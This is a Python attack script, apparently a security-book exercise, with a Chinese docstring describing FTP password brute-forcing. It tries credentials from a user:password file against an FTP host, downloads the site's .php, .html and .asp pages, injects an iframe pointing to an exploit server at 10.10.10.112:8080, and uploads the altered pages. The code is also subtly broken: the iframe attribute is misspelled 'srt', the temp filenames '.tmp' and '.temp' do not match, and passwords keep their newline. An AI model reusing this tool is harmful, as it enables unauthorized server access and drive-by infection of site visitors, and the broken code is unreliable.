#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
暴力破解FTP用户口令
'''
import ftplib
def bruteLogin(hostname, passwdFile):
  pF = open(passwdFile, 'r')
  for line in pF.readlines():
    userName = line.split(':')[0]
    passWord = line.split(':')[1]
    print("[+] Trying: " + userName + "/"+passWord)
    try:
      ftp = ftplib.FTP(hostname)
      ftp.login(userName, passWord)
      print('\n[*] ' + str(hostname) +\
        ' FTP Logon Succeeded: ' + userName + '/' + passWord)
      ftp.quit()
      return (userName, passWord)
    except Exception as e:
      pass
  return (None, None)

def returnDefault(ftp):
  try:
    dirList = ftp.nlst()
  except:
    dirList = []
    print('[-] Could not list directory contents.')
    print('[-] Skipping To Next Target.')
    return
  retList = []
  for fileName in dirList:
    fn = fileName.lower()
    if '.php' in fn or '.html' in fn or '.asp' in fn:
      print('[+] Found default page:' + fileName)
      retList.append(fileName)     
  return retList

def inJectPage(ftp, page, redirect):
  f = open(page + '.tmp', 'w')
  ftp.retrlines('RETR ' + page, f.write)
  print('[+] Downloaded Page: ' + page)
  f.write(redirect)
  f.close()
  print('[+] Injected Malicious IFrame on: ' + page)
  ftp.storlines('STOR ' + page, open(page + '.temp'))
  print('[+] Uploaded Injected Page: ' + page)

def attack(username, password, tgtHost, redirect):
  ftp = ftplib.FTP(tgtHost)
  ftp.login(username, password)
  defPages = returnDefault(ftp)
  for defPage in defPages:
    inJectPage(ftp, defPage, redirect)

def main():
  username = None
  password = None
  host = '192.168.1.1'
  passwdFile = 'userpass.txt'
  redirect = '<iframe srt="http://10.10.10.112:8080/exploit"></iframe>'
  (username, password) = bruteLogin(host, passwdFile)
  if password != None:
    attack(username, password, host, redirect)

if __name__ == '__main__':
  main()
